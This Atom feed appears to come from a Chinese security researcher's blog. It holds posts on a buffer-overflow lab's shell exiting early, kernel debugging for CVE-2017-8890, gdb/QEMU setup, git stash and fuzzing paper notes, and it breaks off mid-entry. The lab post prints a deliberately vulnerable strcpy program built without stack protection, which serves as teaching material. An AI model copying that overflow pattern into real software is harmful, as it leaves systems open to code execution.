<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>PCB博客</title>
  <subtitle>快乐记录每一天</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bin2415.github.io/"/>
  <updated>2019-03-22T05:48:51.725Z</updated>
  <id>http://bin2415.github.io/</id>
  
  <author>
    <name>binpang</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>shellcode exit normally</title>
    <link href="http://bin2415.github.io/2019/03/22/shellcode-exit/"/>
    <id>http://bin2415.github.io/2019/03/22/shellcode-exit/</id>
    <published>2019-03-22T04:46:12.000Z</published>
    <updated>2019-03-22T05:48:51.725Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近和<a href="http://jaguo.github.io" target="_blank" rel="noopener">jaguo</a>在给南京大学软件安全课程出Buffer Overflow实验的时候，发现了出现shellcode exit normally的情况，但是并没有”发现”启动了新的shell。</p>
<h2 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// buf2.c</span></span><br><span class="line"><span class="comment">// gcc −z execstack −o buf buf2 -fno-stack-protector</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul</span><span class="params">(<span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">36</span>];</span><br><span class="line">    <span class="comment">// buffer overflow</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">int</span> n = read(<span class="number">0</span>， str, <span class="number">128</span>);</span><br><span class="line">    <span class="keyword">if</span>(n &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Read Error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    vul(str);</span><br><span class="line">    <span class="built_in">printf</span>(”Returned Properly\n”);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们一开始的设计是漏洞程序如上所示，由于需要注入shellcode，有些是不可见字符，所以我们一开始设计将shellcode写入到一个文件attack_input中，然后通过重定位将输入定位到attack_input文件中，可以将shellcode传给输入。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./buf2 &lt; attack_input</span><br></pre></td></tr></table></figure>
<p>然而这样就导致虽然能够正确注入shellcode，但是只要执行shellcode中的execve(‘/bin//sh’, 0, 0)，就立即退出/bin//sh程序，而不是给出bash的命令行窗口。</p>
<p><img src="/2019/03/22/shellcode-exit/shell_exit.png" alt="shell_exit"></p>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>经过查阅资料发现，我们在使用输入重定位的时候，就相当于将进程的输入重定位到文件中，而当程序将文件中的内容读完之后，会关闭该文件，此时相当于将程序的输入（stdin）关闭了。<br>当该进程启动一个shell进程时，shell进程是该进程的子进程，继承了父进程的文件描述符（包括已经关闭了的标准输入），此时shell发现标准输入已经关闭了，就会退出。</p>
<p>下面我们通过下面的实验来验证一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fclose(<span class="built_in">stdin</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译运行该程序，会发现shell也会正常退出。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>我们的解决方案就是使用文件读函数正常的从文件中读取shellcode。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// buf2.c</span></span><br><span class="line"><span class="comment">// gcc -z execstack -o buf2 buf2.c -fno-stack-protector</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul</span><span class="params">(<span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">36</span>];</span><br><span class="line">    <span class="comment">// buffer overflow</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">128</span>];</span><br><span class="line">    FILE *file;</span><br><span class="line">    file = fopen(<span class="string">"attack_input2"</span>, <span class="string">"r"</span>);</span><br><span class="line">    fread(str, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="number">128</span>, file);</span><br><span class="line">    vul(str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Returned Properly\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近和&lt;a href=&quot;http://jaguo.github.io&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;jag
    
    </summary>
    
    
      <category term="exploit" scheme="http://bin2415.github.io/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>分析CVE-2017-8890</title>
    <link href="http://bin2415.github.io/2019/01/05/kernel-debugging/"/>
    <id>http://bin2415.github.io/2019/01/05/kernel-debugging/</id>
    <published>2019-01-05T12:28:58.000Z</published>
    <updated>2019-03-19T08:35:33.571Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>linux kernel版本：4.10.1</li>
<li>gcc编译: 7.4</li>
<li><p>linux kernel开启KASAN和debug信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_KCOV=y</span><br><span class="line">CONFIG_DEBUG_INFO=y</span><br><span class="line">CONFIG_KASAN=y</span><br><span class="line">CONFIG_KASAN_INLINE=y</span><br><span class="line"></span><br><span class="line">CONFIG_CONFIGFS_FS=y</span><br><span class="line">CONFIG_SECURITYFS=y</span><br></pre></td></tr></table></figure>
</li>
<li><p>在编译的时候出现‘undefined reference to `____ilog2_NaN’ ‘</p>
<p>  解决方案：<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=474c90156c8dcc2fa815e6716cc9394d7930cb9c" target="_blank" rel="noopener">patch</a> 将该patch保存为patch.diff，拷贝到linux内核根目录下。</p>
<p>  运行命令：patch -i patch.diff，提示输入文件时，先后输入include/linux/log2.h和tools/include/linux/log2.h即可。</p>
</li>
</ul>
<h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><h3 id="编译Linux内核"><a href="#编译Linux内核" class="headerlink" title="编译Linux内核"></a>编译Linux内核</h3><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_DEBUG_KERNEL=y</span><br><span class="line">CONFIG_DEBUG_INFO=y</span><br><span class="line"></span><br><span class="line">CONFIG_CONSOLE_POLL=y</span><br><span class="line">CONFIG_KDB_CONTINUE_CATASTROPHIC=0</span><br><span class="line">CONFIG_KDB_DEFAULT_ENABLE=0x1</span><br><span class="line">CONFIG_KDB_KEYBOARD=y</span><br><span class="line">CONFIG_KGDB=y</span><br><span class="line">CONFIG_KGDB_KDB=y</span><br><span class="line">CONFIG_KGDB_LOW_LEVEL_TRAP=y</span><br><span class="line">CONFIG_KGDB_SERIAL_CONSOLE=y</span><br><span class="line">CONFIG_KGDB_TESTS=y</span><br><span class="line">CONFIG_KGDB_TESTS_ON_BOOT=n</span><br><span class="line">CONFIG_MAGIC_SYSRQ=y</span><br><span class="line">CONFIG_MAGIC_SYSRQ_DEFAULT_ENABLE=0x1</span><br><span class="line">CONFIG_SERIAL_KGDB_NMI=n</span><br></pre></td></tr></table></figure>
</code></pre><h3 id="Add-to-your-QEMU-command"><a href="#Add-to-your-QEMU-command" class="headerlink" title="Add to your QEMU command:"></a>Add to your QEMU command:</h3><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">append &apos;kgdbwait kgdboc=ttyS0,115200&apos; \</span><br><span class="line">serial tcp::1234,server,nowait</span><br></pre></td></tr></table></figure>
</code></pre><h3 id="gdb连接"><a href="#gdb连接" class="headerlink" title="gdb连接"></a>gdb连接</h3><ul>
<li>gdb vmlinux</li>
<li>target remote :1234</li>
<li>c</li>
</ul>
<h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><ul>
<li><a href="https://github.com/beraphin/CVE-2017-8890" target="_blank" rel="noopener">poc</a></li>
<li>在qemu里面的虚拟机里面运行poc</li>
<li>此时发生crash:</li>
</ul>
<p><img src="/2019/01/05/kernel-debugging/./crash.png" alt="crash"></p>
<p>可以发现其访问了（rcx+rax)的地址区域， 而该地址是不可访问地址区域</p>
<ul>
<li>手动下断点<ul>
<li>echo g &gt; /proc/sysrq-trigger</li>
</ul>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;linux kernel版本：4.10.1&lt;/li&gt;
&lt;li&gt;gcc编译: 7.4&lt;/li&gt;
&lt;li&gt;&lt;p&gt;linux kern
    
    </summary>
    
      <category term="kernel" scheme="http://bin2415.github.io/categories/kernel/"/>
    
    
      <category term="kernel" scheme="http://bin2415.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>用gdb调试qemu内核</title>
    <link href="http://bin2415.github.io/2019/01/03/debug-kernel/"/>
    <id>http://bin2415.github.io/2019/01/03/debug-kernel/</id>
    <published>2019-01-03T02:54:43.000Z</published>
    <updated>2019-01-04T13:51:04.069Z</updated>
    
    <content type="html"><![CDATA[<h2 id="编译linux内核"><a href="#编译linux内核" class="headerlink" title="编译linux内核"></a>编译linux内核</h2><ul>
<li>下载内核源码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/torvalds/linux.git $KERNEL</span><br></pre></td></tr></table></figure>
<ul>
<li>生成默认的配置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd $KERNEL</span><br><span class="line">make defconfig</span><br><span class="line">make kvmconfig</span><br></pre></td></tr></table></figure>
<ul>
<li>编辑.config，开启一些选项</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> gdb config</span><br><span class="line">CONFIG_GDB_SCRIPTS=y</span><br><span class="line">CONFIG_DEBUG_INFO=y</span><br><span class="line"><span class="meta">#</span> CONFIG_DEBUG_INFO_REDUCED is not set</span><br><span class="line"><span class="meta">#</span> CONFIG_RANDOMIZE_BASE is not set</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> kgdb config</span><br><span class="line"><span class="meta">#</span> CONFIG_STRICT_KERNEL_RWX is not set</span><br><span class="line">CONFIG_FRAME_POINTER=y</span><br><span class="line">CONFIG_KGDB=y</span><br><span class="line">CONFIG_KGDB_SERIAL_CONSOLE=y</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> kdb config</span><br><span class="line"><span class="meta">#</span> CONFIG_STRICT_KERNEL_RWX is not set</span><br><span class="line">CONFIG_FRAME_POINTER=y</span><br><span class="line">CONFIG_KGDB=y</span><br><span class="line">CONFIG_KGDB_SERRIAL_CONSOLE=y</span><br><span class="line">CONFIG_KGDB_KDB=y</span><br><span class="line">CONFIG_KDB_KEYBOARD=y</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> manually debug using the SysRq-G</span><br><span class="line">CONFIG_MAGIC_SysRq=y</span><br></pre></td></tr></table></figure>
<ul>
<li>重新生成config文件，其中有一些子选项，默认即可</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make oldconfig</span><br></pre></td></tr></table></figure>
<ul>
<li>使用GCC编译内核</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j$(nproc)</span><br></pre></td></tr></table></figure>
<h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><ul>
<li>qemu启动的时候添加选项 ‘-gdb tcp:1234’</li>
<li>内核命令行添加’nokaslr’</li>
</ul>
<p>参考qemu配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -S -smp 2 -m 4G -enable-kvm -cpu host \</span><br><span class="line">    -net nic -net user,hostfwd=tcp::10022-:22 \</span><br><span class="line">    -gdb tcp::1234 \</span><br><span class="line">    -kernel ./kernel/arch/x86/boot/bzImage -nographic \</span><br><span class="line">    -device virtio-scsi-pci,id=scsi \</span><br><span class="line">    -device scsi-hd,bus=scsi.0,drive=d0 \</span><br><span class="line">    -drive file=wheezy.img,format=raw,if=none,id=d0 \</span><br><span class="line">    -append &quot;root=/dev/sda noaslr&quot;</span><br></pre></td></tr></table></figure>
<p>gdb 命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb vmlinux</span><br><span class="line">target remote :1234</span><br><span class="line">c</span><br></pre></td></tr></table></figure>
<h2 id="kgdb-kdb调试"><a href="#kgdb-kdb调试" class="headerlink" title="kgdb, kdb调试"></a>kgdb, kdb调试</h2><p>参考qemu配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -smp 2 -m 4G -enable-kvm -cpu host \</span><br><span class="line">    -net nic -net user,hostfwd=tcp::10022-:22 \</span><br><span class="line">    -kernel ./kernel/arch/x86/boot/bzImage -nographic \</span><br><span class="line">    -device virtio-scsi-pci,id=scsi \</span><br><span class="line">    -device scsi-hd,bus=scsi.0,drive=d0 \</span><br><span class="line">    -drive file=wheezy.img,format=raw,if=none,id=d0 \</span><br><span class="line">    -append &quot;root=/dev/sda noaslr kgdbwait kgdboc=ttyS0,115200&quot; \</span><br><span class="line">    -serial tcp::1234,server,nowait</span><br></pre></td></tr></table></figure>
<p>强制下断点：<br>开一个终端连接qemu里的系统，以root用户执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo g &gt; /proc/sysrq-trigger</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;编译linux内核&quot;&gt;&lt;a href=&quot;#编译linux内核&quot; class=&quot;headerlink&quot; title=&quot;编译linux内核&quot;&gt;&lt;/a&gt;编译linux内核&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;下载内核源码&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;hig
    
    </summary>
    
      <category term="kernel" scheme="http://bin2415.github.io/categories/kernel/"/>
    
    
      <category term="kernel" scheme="http://bin2415.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>git本地冲突</title>
    <link href="http://bin2415.github.io/2018/11/27/git%E6%9C%AC%E5%9C%B0%E5%86%B2%E7%AA%81/"/>
    <id>http://bin2415.github.io/2018/11/27/git本地冲突/</id>
    <published>2018-11-27T14:56:04.000Z</published>
    <updated>2018-12-23T05:35:18.271Z</updated>
    
    <content type="html"><![CDATA[<p>在使用git进行多人协作时，一般需要先pull下来，再commit进行push来避免冲突，然而当pull下来的文件与本地文件有冲突怎么办呢，这时“git stash”就派上了用场：</p>
<ul>
<li>先将本地的修改存储起来</li>
</ul>
<p><code>git stash</code></p>
<ul>
<li>pull下来远程仓库的内容</li>
</ul>
<p><code>git pull</code></p>
<p>此时本地的文件已被远程仓库的内容覆盖</p>
<ul>
<li>还原缓存的内容</li>
</ul>
<p><code>git stash pop stash@{0}</code></p>
<ul>
<li>手动解决冲突</li>
</ul>
<p>此时会提示你有冲突，让你手动解决。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在使用git进行多人协作时，一般需要先pull下来，再commit进行push来避免冲突，然而当pull下来的文件与本地文件有冲突怎么办呢，这时“git stash”就派上了用场：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;先将本地的修改存储起来&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;g
    
    </summary>
    
    
      <category term="git" scheme="http://bin2415.github.io/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>fuzzing related work</title>
    <link href="http://bin2415.github.io/2018/10/05/fuzzing/"/>
    <id>http://bin2415.github.io/2018/10/05/fuzzing/</id>
    <published>2018-10-05T07:09:11.000Z</published>
    <updated>2019-03-19T08:30:44.195Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li><p><a href="#interesting-fuzzing">Interesting Fuzzing</a></p>
<ul>
<li><a href="#coverage-based-greybox-fuzzing-as-markov-chainccs-16">Coverage-based Greybox Fuzzing as Markov Chain(CCS 16)</a></li>
<li><a href="#t-fuzz-fuzzing-by-program-transformationoakland-18">T-Fuzz: fuzzing by program transformation(oakland 18)</a></li>
<li><a href="#collafl-path-sensitive-fuzzingoakland-18">CollAFL: Path Sensitive Fuzzing(oakland 18)</a></li>
<li><a href="#driller-argumenting-fuzzing-through-selective-symbolic-executionndss-16">Driller: Argumenting Fuzzing Through Selective Symbolic Execution(ndss 16)</a></li>
<li><a href="#vuzzer-application-aware-evolutionary-fuzzingndss-17">VUzzer: Application-aware Evolutionary Fuzzing(ndss 17)</a></li>
<li><a href="#angora-efficient-fuzzing-by-principled-searchoakland-18">Angora: Efficient Fuzzing by Principled Search(oakland 18)</a>)</li>
<li><a href="#designing-new-operating-primitives-to-improve-fuzzing-performanceccs-17">Designing New Operating Primitives to Improve Fuzzing Performance(CCS 17)</a></li>
<li><a href="#qsym-a-practical-concolic-execution-engine-tailored-for-hybrid-fuzzingusenix-18">QSYM: A Practical Concolic Execution Engine Tailored for Hybrid Fuzzing(Usenix 18)</a></li>
<li><a href="#fairfuzz-a-targeted-mutation-strategy-for-increasing-greybox-fuzz-testing-coveragease-18">FairFuzz: A Targeted Mutation Strategy for Increasing Greybox Fuzz Testing Coverage(ASE 18)</a></li>
<li><a href="#full-speed-fuzzing-reducing-fuzzing-overhead-through-coverage-guided-tracingoakland-19">Full-speed Fuzzing: Reducing Fuzzing Overhead through Coverage-guided Tracing(oakland 19)</a></li>
<li><a href="#profuzzer-on-the-fly-input-type-probing-for-better-zero-day-vulnerability-discoveryoakland-19">ProFuzzer: On-the-fly Input Type Probing for Better Zero-day Vulnerability Discovery(oakland 19)</a></li>
<li><a href="#neuzz-efficient-fuzzing-with-neural-program-smoothingoakland-19">NEUZZ: Efficient Fuzzing with Neural Program Smoothing(oakland 19)</a></li>
<li><a href="#redqueen-fuzzing-with-input-to-state-correspondencendss-19">REDQUEEN: Fuzzing with Input-to-State Correspondence(NDSS 19)</a></li>
<li><a href="#nautilus-fishing-for-deep-bugs-with-grammarsndss-19">NAUTILUS: Fishing for Deep Bugs with Grammars(NDSS 19)</a> </li>
<li><a href="#send-hardest-problems-my-way-probabilistic-path-prioritization-for-hybrid-fuzzingndss-19">Send Hardest Problems My Way: Probabilistic Path Prioritization for Hybrid Fuzzing(NDSS 19)</a>   </li>
</ul>
</li>
<li><p><a href="#directed-fuzzing">Directed Fuzzing</a></p>
<ul>
<li><a href="#directed-greybox-fuzzingccs-17">Directed Greybox Fuzzing(CCS 17)</a></li>
<li><a href="#hawkeye-towards-a-desired-directed-grey-box-fuzzerccs-18">Hawkeye: Towards a Desired Directed Grey-box Fuzzer(CCS 18)</a></li>
</ul>
</li>
<li><p><a href="#fuzzing-machine-learning-model">Fuzzing Machine Learning Model</a></p>
<ul>
<li><a href="#tensorfuzz-debugging-neural-networks-with-coverage-guided-fuzzing18">TensorFuzz: Debugging Neural Networks with Coverage-Guided Fuzzing(18)</a></li>
<li><a href="#coverage-guided-fuzzing-for-deep-neural-networks18">Coverage-Guided Fuzzing for Deep Neural Networks</a></li>
</ul>
</li>
<li><p><a href="#kernel-fuzzing">Kernel Fuzzing</a></p>
<ul>
<li><a href="#razzer-finding-kernel-race-bugs-through-fuzzingoakland-19">RAZZER: Finding Kernel Race Bugs through Fuzzing(oakland 19)</a></li>
<li><a href="#kafl-hardware-assisted-feedback-fuzzing-for-os-kernelsusenix-security-17">kAFL: Hardware-Assisted Feedback Fuzzing for OS Kernels(Usenix Security 17)</a></li>
<li><a href="#fuzzing-file-systems-via-two-dimensional-input-space-explorationoakland-19">Fuzzing File Systems via Two-Dimensional Input Space Exploration(oakland 19)</a></li>
<li><a href="#periscope-an-effective-probing-and-fuzzing-framework-for-the-hardware-os-boundaryndss-19">PeriScope: An Effective Probing and Fuzzing Framework for the Hardware-OS Boundary(NDSS 19)</a></li>
</ul>
</li>
<li><p><a href="#evaluate-fuzzing">Evaluate Fuzzing</a></p>
<ul>
<li><a href="#evaluating-fuzz-testingccs-18">Evaluating Fuzz Testing(CCS 18)</a></li>
</ul>
</li>
</ul>
<h1 id="Interesting-Fuzzing"><a href="#Interesting-Fuzzing" class="headerlink" title="Interesting Fuzzing"></a>Interesting Fuzzing</h1><h2 id="Coverage-based-Greybox-Fuzzing-as-Markov-Chain-CCS-16"><a href="#Coverage-based-Greybox-Fuzzing-as-Markov-Chain-CCS-16" class="headerlink" title="Coverage-based Greybox Fuzzing as Markov Chain(CCS 16)"></a>Coverage-based Greybox Fuzzing as Markov Chain(CCS 16)</h2><ul>
<li><a href="https://github.com/bin2415/fuzzing_paper/tree/master/paper/CCS16_aflfast.pdf" target="_blank" rel="noopener">paper</a></li>
<li><a href="https://github.com/mboehme/aflfast" target="_blank" rel="noopener">source code</a></li>
</ul>
<ul>
<li>Search Strategy</li>
<li>Power Schedule</li>
<li>通过改变前面两个方法来使程序更大概率地走到low-density region.</li>
</ul>
<h2 id="T-Fuzz-fuzzing-by-program-transformation-oakland-18"><a href="#T-Fuzz-fuzzing-by-program-transformation-oakland-18" class="headerlink" title="T-Fuzz: fuzzing by program transformation(oakland 18)"></a>T-Fuzz: fuzzing by program transformation(oakland 18)</h2><ul>
<li><a href="https://github.com/bin2415/fuzzing_paper/tree/master/paper/oakland18_T-Fuzz.pdf" target="_blank" rel="noopener">paper</a></li>
<li><a href="https://github.com/HexHive/T-Fuzz" target="_blank" rel="noopener">source code</a></li>
</ul>
<ul>
<li>Fuzzer: T-Fuzz uses an existing coverage guided fuzzer to generate inputs. T-Fuzz depends on the fuzzer to keep track of the paths taken by all the generated inputs and realtime status infomation regarding whether it is “stuck”. As output, the fuzzer produces all the generated inputs. Any identified crashing inputs are recorded for further anlysis.</li>
<li>Program Transformer: When the fuzzer gets “stuck”, T-Fuzz invokes its Program Transformer to generate tranformed programs. Using the inputs generated by the fuzzer, the Program Transformer first traces the program under test to detect the NCC candidates and then transforms copies of the program by removing certain detected NCC candidates.</li>
<li>Crash Analyzer: For crashing inputs found against the transformed programs, the Crash Analyser filters false positives using a symbolic-execution based analysis technique.</li>
</ul>
<h3 id="T-Fuzz-Design"><a href="#T-Fuzz-Design" class="headerlink" title="T-Fuzz Design"></a>T-Fuzz Design</h3><ul>
<li>Detecting NCCs: NCCs are those sanity checks which are present in the program logic to filter some orthogonal data, e.g., the check for a magic value in the decompressor example above. NCCs can be removed without triggering spurious bugs as they are not intended to prevent bugs. This paper uses a lightweight method to find the NCCs. Firstly, they define the concept of boundary edges: the edges connecting the nodes that were covered by the fuzzer-generated inputs and those that were not. The method that find the NCCs in this paper is over-approximation, so they find two ways to prune undesired NCC condidates.</li>
<li>Program Transformation: After finding NCCs, T-Fuzz should “remove” the NCCs conditions to guide the execution to the another branch. T-Fuzz transforms programs by replacing the detected NCC candidates with negated conditional jump.</li>
<li>Filtering out False Positives and Reproducing Bugs: As the removed NCC candidates might be meaningful guards in the original program(as opposed to, e.g., magic number checks), removing detected NCC edges might introduce new bugs in the transformed program. Consequently, T-Fuzz’s Crash Analyzer verifies that each bug in the transformaed program is also present in the original proram, thus filtering out false positives. The Crash Analyser uses a transformation-aware combination of the preconstrained tracing technique leveraged by Driller and the Path Kneading techniques proposed by ShellSwap to collect path constraints of the original program by tracing the program path leading to a crash in the transformed program.</li>
</ul>
<h2 id="CollAFL-Path-Sensitive-Fuzzing-oakland-18"><a href="#CollAFL-Path-Sensitive-Fuzzing-oakland-18" class="headerlink" title="CollAFL: Path Sensitive Fuzzing(oakland 18)"></a>CollAFL: Path Sensitive Fuzzing(oakland 18)</h2><ul>
<li><a href="https://github.com/bin2415/fuzzing_paper/tree/master/paper/oakland18_collafl.pdf" target="_blank" rel="noopener">paper</a></li>
<li>source code has not been found.</li>
</ul>
